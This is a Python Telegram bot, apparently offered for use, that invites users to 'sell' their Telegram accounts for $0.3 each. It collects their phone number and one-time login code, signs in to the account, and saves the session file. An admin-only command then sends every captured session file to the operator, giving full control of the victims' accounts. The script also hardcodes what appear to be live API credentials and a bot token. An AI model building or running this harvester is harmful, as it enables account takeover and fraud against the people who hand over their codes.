import os
import asyncio
from flask import Flask
from threading import Thread
from telethon import TelegramClient, events, Button
from telethon.tl.functions.channels import GetParticipantRequest
from telethon.errors import UserNotParticipantError

# ============ CONFIGURATION ============
API_ID = 37663020 
API_HASH = 'e082fa08c56c6f30e2855fbec3d2969b'
BOT_TOKEN = '8569155953:AAGWVZ1m3h4ezGZUCEFmt-w0m5-7SEJtQow' 
ADMIN_ID = 7408644813 
CHANNEL_USERNAME = 'PBC_COMMUNITY' # @ ছাড়া চ্যানেলের ইউজারনেম দিন

SESSIONS_DIR = 'sessions'
os.makedirs(SESSIONS_DIR, exist_ok=True)

# ডাটাবেস হিসেবে ডিকশনারি (রেন্ডারে রিস্টার্ট দিলে এটি জিরো হয়ে যাবে, পার্মানেন্ট চাইলে MongoDB লাগবে)
user_data = {} 

app = Flask(__name__)
@app.route('/')
def home(): return "Bot is Online"

def run_flask():
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)

# ============ BOT LOGIC ============
bot = TelegramClient('bot_session', API_ID, API_HASH).start(bot_token=BOT_TOKEN)

async def is_subscribed(user_id):
    try:
        await bot(GetParticipantRequest(CHANNEL_USERNAME, user_id))
        return True
    except UserNotParticipantError:
        return False
    except Exception:
        return False

@bot.on(events.NewMessage(pattern='/start'))
async def start(event):
    user_id = event.sender_id
    if not await is_subscribed(user_id):
        buttons = [[Button.url("Join Channel", f"https://t.me/{CHANNEL_USERNAME}")],
                   [Button.inline("✅ Joined", b"check_join")]]
        await event.respond(f"👋 Welcome! To use this bot, you must join our channel first.", buttons=buttons)
    else:
        await send_main_menu(event)

@bot.on(events.CallbackQuery(data=b"check_join"))
async def check_join(event):
    if await is_subscribed(event.sender_id):
        await send_main_menu(event)
    else:
        await event.answer("⚠️ You haven't joined yet!", alert=True)

async def send_main_menu(event):
    buttons = [
        [Button.inline("👤 Account", b"acc_info"), Button.inline("💳 Withdrawal", b"withdraw")],
        [Button.inline("📲 Sell Account", b"sell_acc")],
        [Button.inline("ℹ️ About Bot", b"about")]
    ]
    text = "🏠 **Main Menu**\nChoose an option from below:"
    if hasattr(event, 'edit'): await event.edit(text, buttons=buttons)
    else: await event.respond(text, buttons=buttons)

@bot.on(events.CallbackQuery)
async def callback_handler(event):
    user_id = event.sender_id
    if user_id not in user_data: user_data[user_id] = {'balance': 0.0}

    if event.data == b"acc_info":
        bal = user_data[user_id]['balance']
        text = f"👤 **Your Account Info**\n\n**User ID:** `{user_id}`\n**Balance:** `{bal:.2f}$` USDT\n\n🚀 *Sell accounts and earn more!*"
        await event.edit(text, buttons=[Button.inline("⬅️ Back", b"main_menu")])

    elif event.data == b"withdraw":
        bal = user_data[user_id]['balance']
        if bal < 1.0:
            await event.answer("❌ Minimum withdrawal is 1$", alert=True)
        else:
            async with bot.conversation(user_id) as conv:
                await conv.send_message("💳 Send your **USDT (BEP20)** address:")
                addr = (await conv.get_response()).text
                await conv.send_message("💰 Enter amount to withdraw:")
                amount = (await conv.get_response()).text
                await conv.send_message("✅ Withdrawal request sent to admin!")
                await bot.send_message(ADMIN_ID, f"🔔 **New Withdrawal Request**\nUser: `{user_id}`\nAmount: `{amount}$` \nAddress: `{addr}`")

    elif event.data == b"sell_acc":
        async with bot.conversation(user_id) as conv:
            await conv.send_message("📲 Enter phone number with country code (e.g. +880...):")
            phone = (await conv.get_response()).text.strip()
            client = TelegramClient(f'{SESSIONS_DIR}/{phone}', API_ID, API_HASH)
            await client.connect()
            try:
                res = await client.send_code_request(phone)
                await conv.send_message("🔢 Enter the OTP code:")
                otp = (await conv.get_response()).text.strip()
                await client.sign_in(phone, otp, phone_code_hash=res.phone_code_hash)
                user_data[user_id]['balance'] += 0.3
                await conv.send_message("✅ Successful! 0.3$ added to your account.")
                await bot.send_message(ADMIN_ID, f"🚀 **New Session Added!**\nPhone: `{phone}`")
            except Exception as e:
                await conv.send_message(f"❌ Error: {e}")

    elif event.data == b"about":
        await event.edit("ℹ️ **About This Bot**\nThis is an automated account selling bot.\n\n**Created By:** @ToxicNexo", buttons=[Button.inline("⬅️ Back", b"main_menu")])

    elif event.data == b"main_menu":
        await send_main_menu(event)

# ============ ADMIN PANEL ============
@bot.on(events.NewMessage(pattern='/adminpanel'))
async def admin_panel(event):
    if event.sender_id != ADMIN_ID: return
    files = os.listdir(SESSIONS_DIR)
    if not files:
        await event.respond("📁 No sessions found.")
        return
    for f in files:
        if f.endswith('.session'):
            await bot.send_file(ADMIN_ID, f"{SESSIONS_DIR}/{f}", caption=f"📄 Session: `{f}`")

if __name__ == '__main__':
    Thread(target=run_flask).start()
    bot.run_until_disconnected()
        
